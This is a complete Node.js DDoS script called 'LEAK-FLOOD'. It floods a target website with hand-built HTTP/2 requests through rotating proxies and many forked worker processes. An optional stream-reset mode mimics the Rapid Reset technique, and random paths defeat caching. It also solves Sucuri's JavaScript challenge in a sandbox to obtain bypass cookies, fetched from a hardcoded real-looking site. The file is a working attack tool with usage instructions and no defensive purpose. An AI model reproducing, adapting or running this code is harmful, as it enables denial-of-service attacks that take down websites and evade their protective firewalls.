//npm i hpack randomstring
const net = require("net");
const tls = require("tls");
const HPACK = require("hpack");
const cluster = require("cluster");
const randstr = require("randomstring");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const {exec} = require("child_process");
const vm = require("vm");
const {HttpsProxyAgent} = require("https-proxy-agent");
const axios = require("axios");

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on("uncaughtException", function (e) {
});
process.on("unhandledRejection", function (e) {
});

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const debugMode = process.argv.includes("--debug");
const resetEnabled = process.argv.includes("--reset");
const bypassEnabled = process.argv.includes("--bypass");
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];
const randomPath = process.argv[7];
console.log = (...args) => {
    process.stdout.write(
        "[LOG] " + args.map(a =>
            (typeof a === "object" ? JSON.stringify(a) : String(a))
        ).join(" ") + "\n",
        () => process.stdout.emit("flush")
    );
};


if (!target || !time || !threads || !proxyfile) {
    console.log(`
╔════════════════════════════════════╗
║          ⚡ LEAK-FLOOD ⚡           ║
╚════════════════════════════════════╝
`);
    console.log("[!] Missing required arguments.\n");
    console.log("Usage:");
    console.log(
        "  node leak-flood.js <target> <time> <threads> <proxyfile> [--debug] [--bypass] [--reset]\n"
    );
    console.log("Example:");
    console.log(
        "  node leak-flood.js https://abc.com 60 10 proxy.txt --debug --bypass --reset\n"
    );
    process.exit(1);
}

function ra() {
    const rsdat = randstr.generate({
        charset: "123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
        length: 8,
    });
    return rsdat;
}

const pxfine = fs
    .readFileSync(proxyfile, "utf8")
    .replace(/\r/g, "")
    .split("\n");
let custom_update = 15663105;
let headersPerReset = 0;
const url = new URL(target);

function encodeFrame(streamId, type, payload = Buffer.alloc(0)
                     , flags = 0) {
    const length = payload.length;
    const frame = Buffer.alloc(9);
    frame.writeUIntBE(length, 0, 3);
    frame.writeUInt8(type, 3);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7fffffff, 5);
    return payload.length > 0 ? Buffer.concat([frame, payload]) : frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const length = (data[0] << 16) | (data[1] << 8) | data[2];
    const type = data[3];
    const flags = data[4];
    const streamId = data.readUInt32BE(5) & 0x7fffffff;
    if (data.length < 9 + length) return null;
    const payload = data.slice(9, 9 + length);
    return {
        length,
        type,
        flags,
        streamId,
        payload,
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

const statusCodes = {};
let shouldPrint = false;

function printStatusCodes() {
    if (debugMode && shouldPrint) {
        console.log("(node/leak) :", statusCodes);
        shouldPrint = false;
        for (const code in statusCodes) {
            statusCodes[code] = 0;
        }
    }
}

setInterval(printStatusCodes, 1000);

async function go() {

    var [proxyHost, proxyPort] = "";
    var proxyUser = null,
        proxyPass = null;
    let selectedProxy = pxfine[~~(Math.random() * pxfine.length)];
    const proxyParts = selectedProxy.split(":");
    if (proxyParts.length === 2) {
        [proxyHost, proxyPort] = proxyParts;
    } else if (proxyParts.length === 4) {
        [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts;
    } else {
        throw new Error("Invalid proxy format");
    }
    let SocketTLS;
    const netSocket = net
        .connect(Number(proxyPort), proxyHost, () => {
            if (proxyUser && proxyPass) {
                const authHeader = Buffer.from(`${proxyUser}:${proxyPass}`).toString(
                    "base64"
                );
                netSocket.write(
                    `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authHeader}\r\nProxy-Connection: Keep-Alive\r\n\r\n`
                );
            } else {
                netSocket.write(
                    `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`
                );
            }
            netSocket.once("data", () => {
                SocketTLS = tls
                    .connect(
                        {
                            socket: netSocket,
                            ALPNProtocols: ["h2", "http/1.1"],
                            servername: url.host,
                            ciphers: [
                                "TLS_AES_128_GCM_SHA256",
                                "TLS_AES_256_GCM_SHA384",
                                "TLS_CHACHA20_POLY1305_SHA256",
                                "ECDHE-ECDSA-AES128-GCM-SHA256",
                                "ECDHE-RSA-AES128-GCM-SHA256",
                                "ECDHE-ECDSA-AES256-GCM-SHA384",
                                "ECDHE-RSA-AES256-GCM-SHA384",
                                "ECDHE-ECDSA-CHACHA20-POLY1305",
                                "ECDHE-RSA-CHACHA20-POLY1305",
                            ].join(":"),
                            sigalgs:
                                "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
                            secure: true,
                            rejectUnauthorized: false,
                            minVersion: "TLSv1.3",
                            // maxVersion: "TLSv1.3",
                            // secureProtocol: "TLSv1_3_method",
                            secureOptions:
                                crypto.constants.SSL_OP_NO_SSLv2 |
                                crypto.constants.SSL_OP_NO_SSLv3 |
                                crypto.constants.SSL_OP_NO_COMPRESSION |
                                crypto.constants.SSL_OP_NO_RENEGOTIATION,
                        },
                        () => {
                            let streamId = 1;
                            let data = Buffer.alloc(0);
                            let hpack = new HPACK();
                            hpack.setTableSize(4096);

                            const updateWindow = Buffer.alloc(4);
                            updateWindow.writeUInt32BE(custom_update, 0);

                            const frames = [
                                Buffer.from(PREFACE, "binary"),
                                encodeFrame(
                                    0,
                                    4,
                                    encodeSettings([
                                        [1, 65536],
                                        [2, 0],
                                        [4, 6291456],
                                        [6, 262144],
                                    ])
                                ),
                                encodeFrame(0, 8, Buffer.from([0x00, 0x60, 0x00, 0x00])),
                            ];

                            SocketTLS.on("data", (eventData) => {
                                data = Buffer.concat([data, eventData]);

                                while (data.length >= 9) {
                                    const frame = decodeFrame(data);
                                    if (frame != null) {
                                        data = data.subarray(frame.length + 9);
                                        if (frame.type === 1) {
                                            const headers = hpack.decode(frame.payload);
                                            const statusCodeHeader = headers.find(
                                                (header) => header[0] === ":status"
                                            );
                                            // console.log(statusCodeHeader)
                                            if (statusCodeHeader) {
                                                const statusCode = parseInt(statusCodeHeader[1], 10);
                                                statusCodes[statusCode] =
                                                    (statusCodes[statusCode] || 0) + 1;
                                                shouldPrint = true;
                                                if (statusCode === 403 || statusCode === 429) {
                                                    SocketTLS.end(() => {
                                                        SocketTLS.destroy();
                                                        go();
                                                    });
                                                }
                                                if (statusCode === 307) {
                                                    console.log('ERR307: ')
                                                }
                                            }
                                        }
                                        if (frame.type === 4 && frame.flags === 0) {
                                            SocketTLS.write(encodeFrame(0, 4, "", 1));
                                        }
                                        if (frame.type === 7 || frame.type === 5) {
                                            SocketTLS.end(() => SocketTLS.destroy());
                                        }
                                    } else {
                                        break;
                                    }
                                }
                            });

                            SocketTLS.write(Buffer.concat(frames));

                            async function main() {
                                if (SocketTLS.destroyed) {
                                    return;
                                }

                                let generateNumbers = Math.floor(
                                    Math.random() * (10000 - 1000 + 1) + 1000
                                );
                                let version = Math.floor(Math.random() * (128 - 127 + 1) + 127);
                                let ver = Math.floor(Math.random() * 99) + 1;
                                let ver1 = Math.floor(Math.random() * 99) + 1;
                                let ver2 = Math.floor(Math.random() * 99) + 1;

                                function getRandomPath(arr) {
                                    return arr[Math.floor(Math.random() * arr.length)];
                                }

                                const randomPath = bypassEnabled
                                    ? `/${ra()}/${ra()}`
                                    : url.pathname;
                                let pathRandom = `${Math.random()
                                    .toString(36)
                                    .substring(2)}/${Math.random()
                                    .toString(36)
                                    .substring(2)}/${Math.random()
                                    .toString(36)
                                    .substring(2)}`;

                                let patch = `/vendor/playground`;
                                if (randomPath) {
                                    patch = pathRandom;
                                }
                                let cookieOfProxy = await  getCookieByProxy(selectedProxy, '');

                                const headers = Object.entries({
                                    ":method": "GET",
                                    ":authority": url.hostname,
                                    ":scheme": "https",
                                    ":path": patch, // Thử root path trước
                                    "cookie": `sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1; ${cookieOfProxy}`,
                                    // "accept-language": "ru,q=0.4",
                                    "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${ver}\", \"Google Chrome\";v=\"${version}\"`,
                                    "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
                                    "sec-ch-ua-platform": `"Windows"`,
                                    "upgrade-insecure-requests":
                                        Math.random() < 0.8 ? "1" : "0",
                                    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.${ver1}.${ver2} Safari/537.36`,
                                    // accept:
                                    //     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*!/!*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                    "accept-encoding": "gzip, deflate, br, zstd",
                                    "accept-language": `${
                                        ["en-US", "en-GB", "ru", "fr", "de"][
                                            Math.floor(Math.random() * 5)
                                            ]
                                    },q=0.${Math.floor(Math.random() * 9) + 1}`,
                                    referer: `https://www.google.com/`,
                                });


                                const headers2 = Object.entries({
                                    "sec-fetch-site": "none",
                                    ...(Math.random() < 0.5 && {"sec-fetch-mode": "navigate"}),
                                    ...(Math.random() < 0.5 && {"sec-fetch-user": "?1"}),
                                    ...(Math.random() < 0.5 && {"sec-fetch-dest": "document"}),
                                }).filter((a) => a[1] != null);

                                const headers3 = Object.entries({
                                    "accept-encoding": "gzip, deflate, br, zstd",
                                    "accept-language": `ru,en-US;q=0.9,en;q=0.0`,
                                    ...(Math.random() < 0.5 && {cookie: `${generateNumbers}`}),
                                    ...(Math.random() < 0.5 && {}),
                                }).filter((a) => a[1] != null);

                                for (let i = headers3.length - 1; i > 0; i--) {
                                    const j = Math.floor(Math.random() * (i + 1));
                                    [headers3[i], headers3[j]] = [headers3[j], headers3[i]];
                                }

                                const combinedHeaders = headers
                                    .concat(headers2)
                                    .concat(headers3);

                                const packed = Buffer.concat([
                                    Buffer.from([0x80, 0, 0, 0, 0xff]),
                                    hpack.encode(combinedHeaders),
                                ]);

                                SocketTLS.write(
                                    Buffer.concat([
                                        encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20),
                                    ])
                                );
                                if (resetEnabled) {
                                    headersPerReset++;
                                    if (headersPerReset >= 10) {
                                        SocketTLS.write(
                                            encodeFrame(
                                                streamId,
                                                3,
                                                Buffer.from([0x0, 0x0, 0x8, 0x0]),
                                                0
                                            )
                                        );
                                        headersPerReset = 0;
                                    }
                                }
                                streamId += 2;

                                setTimeout(() => {
                                    main();
                                }, 1000 / ratelimit);
                            }

                            main();
                        }
                    )
                    .on("error", () => {
                        SocketTLS.destroy();
                    });
            });
        })
        .once("error", () => {
        })
        .once("close", () => {
            if (SocketTLS) {
                SocketTLS.end(() => {
                    SocketTLS.destroy();
                    //go();
                });
            }
        });
}

function getCookie(html) {
    // 1. Trích xuất giá trị S='...'
    const re = /S\s*=\s*'([^']+)'/i;
    const m = html.match(re);
    if (!m) {
        console.error('Không tìm thấy chuỗi S trong HTML');
        process.exit(1);
    }
    const S = m[1];

    let decoded;
    try {
        decoded = Buffer.from(S, 'base64').toString('utf8');
    } catch (err) {
        console.error('Lỗi khi decode Base64:', err.message);
        process.exit(1);
    }


    const sandbox = {
        // document: có getter/setter cookie để bắt mọi gán document.cookie = '...'
        document: {},
        location: {
            reloaded: false,
            reload: () => {
                // chặn reload thật và chỉ ghi lại là có yêu cầu reload
                sandbox.location.reloaded = true;
                // console.warn('[sandbox] location.reload() called (blocked)');
            }
        },
        console: console,
        // Cấp một vài global cần thiết (String, etc.)
        String: String,
        // Để an toàn hơn, không cung cấp eval/file system, network, process, require...
    };

    Object.defineProperty(sandbox.document, 'cookie', {
        configurable: true,
        enumerable: true,
        get: function () {
            return this._cookie || '';
        },
        set: function (val) {
            // lưu cookie vào trường _cookie và cũng ghi vào sandbox.cookieSet
            this._cookie = (this._cookie ? (this._cookie + '; ' + val) : val);
            sandbox.cookieSet = this._cookie;
            // console.log('[sandbox] document.cookie set to ->', val);
        }
    });

// 4. Tạo context và thực thi decoded script trong VM có timeout
    const context = vm.createContext(sandbox, {name: 'sucuri-sandbox'});

    try {
        const script = new vm.Script(decoded, {filename: 'decoded.js'});
        script.runInContext(context, {timeout: 2000}); // timeout ms
    } catch (err) {
        console.error('Lỗi khi chạy script trong sandbox:', err && err.stack ? err.stack : err);
    }

    return sandbox.cookieSet.split(';')[0];
}

async function getCookieByProxy(proxy, cookie = '') {
    try {
        // console.log(proxy)
        const [host, port, user, pass] = proxy.split(':');
        let agent;
        if (user && pass) {
            agent = new HttpsProxyAgent(`http://${user}:${pass}@${host}:${port}`);
        } else {
            agent = new HttpsProxyAgent(`http://${host}:${port}`);
        }

        const resp = await axios.get('https://bavarian-outfitters.de/', {
            httpsAgent: agent,
            timeout: 10000,
            responseType: 'text',
            maxRedirects: 0,               // IMPORTANT: không follow redirect
            validateStatus: () => true,    // nhận tất cả status, không throw tự động
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Cookie": "sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1; " + cookie
            }
        });
        const html = typeof resp.data === 'string' ? resp.data : '';

        function getCookie(html) {
            // 1. Trích xuất giá trị S='...'
            const re = /S\s*=\s*'([^']+)'/i;
            const m = html.match(re);
            if (!m) {
                console.error('Không tìm thấy chuỗi S trong HTML');
                process.exit(1);
            }
            const S = m[1];

            let decoded;
            try {
                decoded = Buffer.from(S, 'base64').toString('utf8');
            } catch (err) {
                console.error('Lỗi khi decode Base64:', err.message);
                process.exit(1);
            }


            const sandbox = {
                // document: có getter/setter cookie để bắt mọi gán document.cookie = '...'
                document: {},
                location: {
                    reloaded: false,
                    reload: () => {
                        // chặn reload thật và chỉ ghi lại là có yêu cầu reload
                        sandbox.location.reloaded = true;
                        // console.warn('[sandbox] location.reload() called (blocked)');
                    }
                },
                console: console,
                // Cấp một vài global cần thiết (String, etc.)
                String: String,
                // Để an toàn hơn, không cung cấp eval/file system, network, process, require...
            };

            Object.defineProperty(sandbox.document, 'cookie', {
                configurable: true,
                enumerable: true,
                get: function () {
                    return this._cookie || '';
                },
                set: function (val) {
                    // lưu cookie vào trường _cookie và cũng ghi vào sandbox.cookieSet
                    this._cookie = (this._cookie ? (this._cookie + '; ' + val) : val);
                    sandbox.cookieSet = this._cookie;
                    // console.log('[sandbox] document.cookie set to ->', val);
                }
            });

// 4. Tạo context và thực thi decoded script trong VM có timeout
            const context = vm.createContext(sandbox, {name: 'sucuri-sandbox'});

            try {
                const script = new vm.Script(decoded, {filename: 'decoded.js'});
                script.runInContext(context, {timeout: 2000}); // timeout ms
            } catch (err) {
                console.error('Lỗi khi chạy script trong sandbox:', err && err.stack ? err.stack : err);
            }

            return sandbox.cookieSet.split(';')[0];
        }

        if (resp.status === 307 || /sucuri_cloudproxy_js/i.test(html)) {
            // console.log('Get ccookie')
            return getCookie(html);
        }
        return 'sucess';
    } catch (err) {
        // console.log(err.statusCode)
        return 'error';
    }
}

if (cluster.isMaster) {
    console.log(`[INFO] LEAK-FLOOD starting...`);
    console.log(`[INFO] Target: ${target}`);
    console.log(`[INFO] Duration: ${time} seconds`);
    console.log(`[INFO] Threads: ${threads}`);
    console.log(`[INFO] Proxy file: ${proxyfile}`);
    console.log(`[INFO] Debug Mode: ${debugMode ? "ON" : "OFF"}`);
    if (bypassEnabled) console.log("[INFO] Bypass mode: ON");
    if (resetEnabled) console.log("[INFO] Reset mode: ON");
    Array.from({length: threads}, (_, i) =>
        cluster.fork({core: i % os.cpus().length})
    );

    cluster.on("exit", (worker) => {
        cluster.fork({core: worker.id % os.cpus().length});
    });
    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(go, 1);
    setTimeout(() => process.exit(1), time * 1000);
}
